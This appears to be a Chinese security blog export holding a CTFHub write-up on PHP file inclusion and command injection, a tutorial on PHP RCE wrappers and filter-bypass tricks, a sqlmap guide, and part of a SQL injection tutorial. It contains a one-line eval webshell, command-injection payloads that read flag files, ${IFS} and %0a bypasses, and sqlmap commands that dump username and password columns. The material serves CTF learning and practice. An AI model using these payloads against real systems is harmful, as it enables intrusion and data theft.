将文件里的代码当作原来文件的代码执行</p></blockquote><p>点击shell得到一串php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ctfhub&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码得出：需要用GET传参方式传参，参数为file</p><p><code>payload：?file=shell.txt</code><br>点击shell得到php代码：<code>&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;</code></p><p><code>payload：以post方式传参：ctfhub=system(&quot;ls&quot;)</code><br>根据回显发现没有有关flag的文件，那就读取上级目录看看</p><p><code>payload：ctfhub=system(&quot;ls /&quot;)</code><br>根据回显发现flag</p><p><code>payload：ctfhub=system(&quot;cat /flag&quot;)</code><br>得到flag</p><h2 id="三、php-input"><a href="#三、php-input" class="headerlink" title="三、php://input"></a>三、php://input</h2><p>打开环境发现php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;php://&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag? &lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码得出：需要以GET方式传入一个名为file参数的数据，点击phpinfo()发现，php://input可以使用</p><p><code>payload：?file=php://input</code><br>根据<code>php://input</code>规则，需要POST传入数据</p><p><code>payload：&lt;?php system(&quot;ls&quot;);?&gt;</code><br>根据回显发现没有flag，查找上级目录</p><p><code>payload：&lt;?php system(&quot;ls /&quot;);?&gt;</code><br>发现flag，查看</p><p><code>payload：&lt;?php system(&quot;cat /flag_4801&quot;);?&gt;</code><br>得到flag</p><h2 id="四、读取源代码"><a href="#四、读取源代码" class="headerlink" title="四、读取源代码"></a>四、读取源代码</h2><p>打开环境得到php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;php://&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag? &lt;br&gt;</span></span><br><span class="line"><span class="string">flag in &lt;code&gt;/flag&lt;/code&gt;</span></span><br></pre></td></tr></table></figure><p>根据提示使用php://input发现不管用，用一下新的伪协议吧——php://filter</p><p><code>payload：?file=php://filter/resource=/flag</code><br>flag一下子就出来了呢</p><h2 id="五、远程包含"><a href="#五、远程包含" class="headerlink" title="五、远程包含"></a>五、远程包含</h2><p>打开环境得到代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag?&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>用一下php://input吧，一下子就得到了flag呢</p><p><code>payload：&lt;?php system(&quot;cat /flag&quot;);?&gt;</code></p><h2 id="六、命令注入"><a href="#六、命令注入" class="headerlink" title="六、命令注入"></a>六、命令注入</h2><p>根据回显得出这是一个ping IP的题目</p><p>ping一下baidu.com得到回显</p><p><code>payload：baidu.com | ls</code><br>得到回显并发现可疑.php文件，打开发现打不开该文件，试一下base64吧</p><p><code>payload：baidu.com | cat 31327443624755.php | base64 </code><br>再解码得到flag</p><h2 id="七、过滤cat"><a href="#七、过滤cat" class="headerlink" title="七、过滤cat"></a>七、过滤cat</h2><p>直接上payload</p><p><code>payload：baidu.com | ls</code><br>得到flag文件，但是cat被过滤了，换个吧</p><p><code>payload：baidu.com | more flag_34911944417894.php | base64  </code><br>得到加密后的flag，解码得到flag</p><h2 id="八、过滤空格"><a href="#八、过滤空格" class="headerlink" title="八、过滤空格"></a>八、过滤空格</h2><p>直接上payload</p><p><code>payload：baidu.com | ls</code><br>发现没有东西，空格被过滤</p><p><code>payload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;ls</code><br>得到flag文件，查看该文件</p><p><code>payload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;cat$&#123;IFS&#125;flag_31123320624556.php$&#123;IFS&#125;|$&#123;IFS&#125;base64</code><br>解密得到flag</p><h2 id="九、过滤目录分隔符"><a href="#九、过滤目录分隔符" class="headerlink" title="九、过滤目录分隔符"></a>九、过滤目录分隔符</h2><p><code>payload：baidu.com | ls</code><br>得到flag目录</p><p><code>payload：baidu.com;cd flag_is_here;ls</code><br>得到flag文件，查看文件</p><p><code>payload：baidu.com;cd flag_is_here;cat flag_4088165719730.php|base64</code><br>解码得到flag</p><h2 id="十、过滤运算符"><a href="#十、过滤运算符" class="headerlink" title="十、过滤运算符"></a>十、过滤运算符</h2><p>过滤了运算符，但是**;**漏掉了</p><p><code>payload：baidu.com;ls</code><br>查看flag文件</p><p>base64 <em>.php &lt;=&gt;</em>,php|base64</p><p><code>payload：baidu.com;base64 flag_80902931728195.php</code></p><h2 id="十一、综合过滤练习"><a href="#十一、综合过滤练习" class="headerlink" title="十一、综合过滤练习"></a>十一、综合过滤练习</h2><p>看完代码傻眼了，啥都被过滤了，哎~~~</p><p>看看过滤笔记再来试试看<br>;可以用%0a代替但是需要在url上使用</p><p><code>payload：baidu.com%0als</code><br>得到flag目录，继续搞</p><p><code>payload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0als</code><br>得到flag文件</p><p><code>payload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0abase64$&#123;IFS&#125;fl&#39;&#39;ag_248952873310635.php</code><br>解码得到flag</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFHUB-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE(远程代码执行漏洞)</title>
      <link href="/post/de7b7d00.html"/>
      <url>/post/de7b7d00.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><blockquote><p>应用有时需要调用一些<strong>执行系统命令的函数</strong>，如PHP中的<strong>system、exec、shell_exec、passthru、popen、proc_popen</strong>等，当用户能<strong>控制这些函数的参数</strong>，并且开发人员对<strong>这个参数没有严格的过滤</strong>时就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是<strong>命令执行漏洞。</strong></p></blockquote><h2 id="可能存在命令执行漏洞的函数（PHP）"><a href="#可能存在命令执行漏洞的函数（PHP）" class="headerlink" title="可能存在命令执行漏洞的函数（PHP）"></a>可能存在命令执行漏洞的函数（PHP）</h2><ol><li>利用系统函数实现命令执行的函数</li></ol><blockquote><p>eval()<br>assert()<br>preg_replace()<br>call_user_func()</p></blockquote><ol start="2"><li>直接执行系统命令的代码函数</li></ol><blockquote><p>system()<br>exec()<br>shell_exec()&amp;(``)<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()</p></blockquote><h2 id="命令拼接符号"><a href="#命令拼接符号" class="headerlink" title="命令拼接符号"></a>命令拼接符号</h2><ol><li>Windows的系统命令拼接符</li></ol><table><thead><tr><th>拼接符</th><th>示例</th><th>拼接符的详解</th></tr></thead><tbody><tr><td>&amp;</td><td>A&amp;B</td><td>无论A是false还是true，B都执行，即互不影响</td></tr><tr><td>&amp;&amp;</td><td>A&amp;&amp;B</td><td>具有短路效果，A是false，B就不执行，有短路效果</td></tr><tr><td>|</td><td>A|B</td><td>表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行</td></tr><tr><td>||</td><td>A||B</td><td>表示A命令语句执行失败，然后才执行B命令语句</td></tr></tbody></table><ol start="2"><li>Linux的系统命令拼接符</li></ol><blockquote><p><strong>&amp;</strong>    使命令在后台运行<br><strong>;</strong>    进行多条命令的无关联执行，每一条执行结果互不影响<br><strong>&amp;&amp;</strong>    与Windows一样，左边成功才执行右边<br><strong>||</strong>    与Windows一样，前面执行失败才执行后面<br><strong>()</strong>    执行多个命令时，需要用命令分隔符分号隔开每个命令，并使用**()**把所有命令组合起来</p></blockquote><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>php支持的伪协议</p><blockquote><p>file://    访问本地文件<br>http://    访问HTTP(s)网址<br>ftp://    访问FTP(s) URLs<br>php://    访问各个输入/输出流（I/O streams）<br>zlib://    压缩流<br>data://    数据（RFC 2397）<br>glob://    查找匹配的文件路径模式<br>phar://    PHP 归档<br>ssh2://    Secure Shell 2<br>rar://    RAR<br>ogg://    音频流<br>expect://    处理交互式的流</p></blockquote><h3 id="一、php-filter"><a href="#一、php-filter" class="headerlink" title="一、php://filter"></a>一、php://filter</h3><blockquote><p>获取指定文件源码。当他与包含函数结合时，php://filter流会被当作php文件执行。</p></blockquote><p>协议参数</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>常用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line">php:<span class="comment">//filter/resource=index.php</span></span><br><span class="line"></span><br><span class="line">convert.base64-encode过滤器</span><br></pre></td></tr></table></figure><h3 id="二、data"><a href="#二、data" class="headerlink" title="二、data://"></a>二、data://</h3><blockquote><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 打印 &quot;I love PHP&quot;</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="title function_ invoke__">file_get_contents</span> ( <span class="string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="三、file"><a href="#三、file" class="headerlink" title="三、file://"></a>三、file://</h3><blockquote><p>用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响<br>file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)<br>比如：?file=file:///etc/passsword</p></blockquote><h3 id="四、php"><a href="#四、php" class="headerlink" title="四、php://"></a>四、php://</h3><blockquote><p>在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用<br>php://作用为访问输入输出流</p></blockquote><h3 id="五、php-input"><a href="#五、php-input" class="headerlink" title="五、php://input"></a>五、php://input</h3><blockquote><p><strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p></blockquote><p>例如：?cmd=php://input<br>POST数据：<code>&lt;?php phpinfo()?&gt;</code><br>注意：<br>当<code>enctype=&quot;multipart/form-data&quot;</code>的时候<code>php://input</code>是无效的<br>遇到<code>file_get_contents()</code>要想到用<code>php://input</code>绕过</p><h3 id="六、zip"><a href="#六、zip" class="headerlink" title="六、zip://"></a>六、zip://</h3><blockquote><p>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p><p>例如：<code>zip://[压缩包绝对路径]#[压缩包内文件]</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="comment">//中只能传入绝对路径。</span></span><br><span class="line">要用<span class="comment">#分隔压缩包和压缩包里的内容，并且#要用url编码%23</span></span><br><span class="line">只需要是zip的压缩包即可，后缀名可以任意更改。</span><br><span class="line">相同的类型的还有zlib:<span class="comment">//和bzip2://</span></span><br></pre></td></tr></table></figure><p>例如：?file=zip://D:\zip.jpg%23phpinfo.txt</p><p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 </a></p><h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><ul><li>cat被过滤时</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">more     #一页一页的显示档案内容</span><br><span class="line">less     #与 more 类似</span><br><span class="line">head     #查看头几行</span><br><span class="line">tac      #从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail     #查看尾几行</span><br><span class="line">nl       #显示的时候，顺便输出行号</span><br><span class="line">od       #以二进制的方式读取档案内容</span><br><span class="line">sort     #可以查看</span><br><span class="line">uniq     #可以查看</span><br><span class="line">//vi       #一种编辑器，这个也可以查看</span><br><span class="line">//vim      #一种编辑器，这个也可以查看</span><br><span class="line">//file -f  #报错出具体内容</span><br><span class="line">//sh /flag 2&gt;%261  #报错出文件内容</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用转义符号</span></span><br><span class="line">ca\t /fl\ag</span><br><span class="line">cat fl&#x27;&#x27;ag</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拼接法</span></span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat$IFS$a$b</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用空变量$*和<span class="variable">$@</span>，<span class="variable">$x</span>,<span class="variable">$&#123;x&#125;</span>绕过</span></span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">*t flag || ca<span class="variable">$@t</span> flag || ca<span class="variable">$5t</span> flag ca<span class="variable">$&#123;5&#125;</span>t flag</span></span><br><span class="line"></span><br><span class="line">find    #列出当前目录下的文件以及子目录所有文件</span><br></pre></td></tr></table></figure><ul><li>过滤空格</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;flag  #重定向符</span><br><span class="line"><span class="meta prompt_">cat$</span><span class="language-bash">&#123;IFS&#125;flag || <span class="built_in">cat</span>$IFS<span class="variable">$9flag</span> <span class="comment">#全局变量</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="variable">$IFS</span>在linux下表示分隔符，但是如果单纯的<span class="built_in">cat</span><span class="variable">$IFS2</span>,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">为什么要用<span class="variable">$9</span>呢，因为<span class="variable">$9</span>是当前系统shell进程的第九个参数的持有者，它始终为空字符串</span></span><br></pre></td></tr></table></figure><ul><li>过滤目录分隔符</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">采用多管道命令绕过</span></span><br><span class="line">127.0.0.1||cd flag_is_here;cat flag_262431433226364.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0a      <span class="comment">#换行符</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">0d      <span class="comment">#回车符号</span></span></span><br><span class="line">用?&gt;代替 ;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在php中可以用?&gt;来代替最后的一个; ，因为php遇到定界符关闭标签会自动在末尾加上一个分号</span></span><br></pre></td></tr></table></figure><p>其他绕过：<a href="https://zhuanlan.zhihu.com/p/391439312">命令执行(RCE)面对各种过滤，骚姿势绕过总结 </a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/post/e5da2ca1.html"/>
      <url>/post/e5da2ca1.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h1><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。</p><h1 id="用于数据库注入"><a href="#用于数据库注入" class="headerlink" title="用于数据库注入"></a>用于数据库注入</h1><ol><li>猜解是否能注入</li></ol><blockquote><p>python sqlmap.py -u “url”</p></blockquote><ol start="2"><li>猜解库</li></ol><blockquote><p>python sqlmap.py -u “url” –dbs</p></blockquote><ol start="3"><li>猜解表</li></ol><blockquote><p>python sqlmap.py -u “url” –tables</p></blockquote><ol start="4"><li>根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</li></ol><blockquote><p>python sqlmap.py -u “url” –columns -T admin</p></blockquote><ol start="5"><li>根据字段猜解内容(假如通过3得到字段为username和password)</li></ol><blockquote><p>python sqlmap.py -u “url” –dump -T admin -C “username,password”</p></blockquote><h1 id="用于cookie注入"><a href="#用于cookie注入" class="headerlink" title="用于cookie注入"></a>用于cookie注入</h1><ol><li>cookie注入，猜解表</li></ol><blockquote><p>python sqlmap.py -u “url” –cookie “cookie” –table –level 2</p></blockquote><ol start="2"><li>猜解字段，(通过1的表猜解字段，假如表为admin)</li></ol><blockquote><p>python sqlmap.py -u “url” –cookie “cookie” –columns -T admin –level 2</p></blockquote><ol start="3"><li>猜解内容</li></ol><blockquote><p>python sqlmap.py -u “url” –cookie “cookie” –dump -T admin -C “username,password” –level 2</p></blockquote><h1 id="post登录框注入"><a href="#post登录框注入" class="headerlink" title="post登录框注入"></a>post登录框注入</h1><ol><li>浏览器打开目标地址</li><li>burp抓包，拦截请求</li><li>点击提交，burp会拦截post请求</li><li>复制post请求头为post.txt，并放到sqlmap目录下</li><li>运行sqlmap</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">step1：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;]  <span class="operator">/</span><span class="operator">/</span>测试是否存在注入</span><br><span class="line">step2：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="comment">--current-db //查询当前数据库</span></span><br><span class="line">step3：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="operator">-</span>D [&quot;数据库名&quot;] <span class="comment">--tables //查询当前数据库的所有表</span></span><br><span class="line">step4：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="operator">-</span>D [&quot;数据库名&quot;] <span class="operator">-</span>T [&quot;表名&quot;] <span class="comment">--columns //查询指定库指定表的所有字段</span></span><br><span class="line">step5：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="operator">-</span>D [&quot;数据库名&quot;] <span class="operator">-</span>T [&quot;表名&quot;] <span class="operator">-</span>C [&quot;字段名&quot;] <span class="comment">--dump //打印出指定库指定表指定字段的所有字段内容</span></span><br></pre></td></tr></table></figure><h1 id="常见参数使用"><a href="#常见参数使用" class="headerlink" title="常见参数使用"></a>常见参数使用</h1><ul><li>设置目标URL：</li></ul><blockquote><p>参数：-u    每次只能扫描一个url<br>格式：sqlmap -u “url”</p><p>参数：-m    从文本中获取多个目标扫描，但是每次只能有一个url<br>格式：sqlmap -m 1.txt、</p><p>参数：-r    从文件中加载HTTP请求，这样的话，就不需要再去设定coolie，POST数据等值…..<br>格式：sqlmap -r 1.txt</p></blockquote><ul><li>设置回显等级：</li></ul><blockquote><p>参数：-v<br>0、只显示python错误以及严重的信息。<br>1、同时显示基本信息和警告信息。（默认等级）<br>2、同时显示debug信息。<br>3、同时显示注入的payload。<br>4、同时显示HTTP请求。<br>5、同时显示HTTP响应头。<br>6、同时显示HTTP响应页。</p></blockquote><ul><li>设定探测等级：</li></ul><blockquote><p>参数：–level<br>默认为1<br>level&gt;=2的时候就会测试HTTP Cookie<br>level&gt;=3的时候就会测试HTTP User-Agent/Referer头<br>level=5的时候会测试HTTP Host</p></blockquote><h1 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h1><ul><li>options类：</li></ul><blockquote><p>sqlmap –version    查看sqlmap版本信息.</p><p>-h    查看功能参数(常用的)</p><p>-hh　查看所有的参数 (如果有中文包 就最好了)</p><p>-v　显示更详细的信息 一共7级, 从0-6.默认为1, 数值越大,信息显示越详细.</p></blockquote><ul><li>Target(指定目标):</li></ul><blockquote><p>-d　直接连接数据库侦听端口,类似于把自己当一个客户端来连接.</p><p>-u    指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 </p><p>-l    指定logfile文件进行扫描,可以结合burp 把访问的记录保存成一个log文件, sqlmap可以直接加载burp保存到log文件进行扫描</p><p>-x    以xml的形式提交一个站点地图给sqlmap(表示不理解..)</p><p>-m    如果有多个url地址,可以把多个url保存成一个文本文件 -m可以加载文本文件逐个扫描</p><p>-r    把http的请求头,body保存成一个文件 统一提交给sqlmap,sqlmap会读取内容进行拼接请求体</p><p>-g    利用谷歌搜索引擎搭配正则来过滤你想要的</p><p>-c    加载配置文件,配置文件可以指定扫描目标,扫描方式,扫描内容等等.加载了配置文件sqlmap就会根据文件内容进行特定的扫描</p></blockquote><ul><li>Request类参数</li></ul><blockquote><p>–data    提交的时候要携带的参数（get，post通用，最简单的post请求方式）</p><p>–users     获取数据库用户</p><p>–dbs    获取所有数据库</p><p>–cookie    设置cookie头</p><p>–user-agent    指定user-agent（防止对方服务器侦测到）</p><p>–random-agent    随机agent</p><p>–host    指定host头</p><p>–level    安全级别 (1-5, &gt;=3,检测anent,&gt;=5,检测host头)</p><p>–referer    指定referer头(level &gt;=3才检测)</p><p>–headers    指定额外的headers请求头(多个必须使用换\n,首字母必须大写)</p><p>–method　指定请求方式, 默认为get,get请求不成功尝试post　　　</p><p>–proxy　指定代理 </p><p>–proxy-cred    指定代理的账号密码(代理需要账号密码的前提下)</p><p>–delay　每次请求的延迟时间,单位秒,默认无延迟.</p><p>–timeout　请求超时时间,默认30秒.</p><p>–retries　连接超时重试次数 ,默认3次</p></blockquote><p class='item-img' data-src='C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20230415214523405.png'><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20230415214523405.png" alt="image-20230415214523405"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/post/530fceb2.html"/>
      <url>/post/530fceb2.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><blockquote><p>SQL 注入就是指 web应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 sql语句来实现 对数据库的任意操作。</p></blockquote><h2 id="SQL注入攻击思路"><a href="#SQL注入攻击思路" class="headerlink" title="SQL注入攻击思路"></a>SQL注入攻击思路</h2><blockquote><ol><li>判断是否存在注入</li><li>判断注入类型</li><li>猜解语句中的字段数</li><li>判断回显位置</li><li>爆数据库名</li><li>爆表名</li><li>爆字段名</li><li>查找内容</li></ol></blockquote><h2 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h2><blockquote><p>最为经典的单引号判断法：<br>在参数后面加上单引号,比如: <code>http://xxx/abc.php?id=1&#39;</code> 如果页面返回错误，则存在SQL注入。<br>原因是无论字符型还是整型都会因为单引号个数不匹配而报错。</p></blockquote><h2 id="判断SQL注入类型"><a href="#判断SQL注入类型" class="headerlink" title="判断SQL注入类型"></a>判断SQL注入类型</h2><p>类型分为两种：数字型和字符型</p><ul><li>数字型判断：<br>可以使用经典的 and 1=1 和 and 1=2 来判断：</li></ul><blockquote><p>url中输入？id=1 and 1=1 页面依旧正常运行，继续下一步<br>url中输入？id=1 and 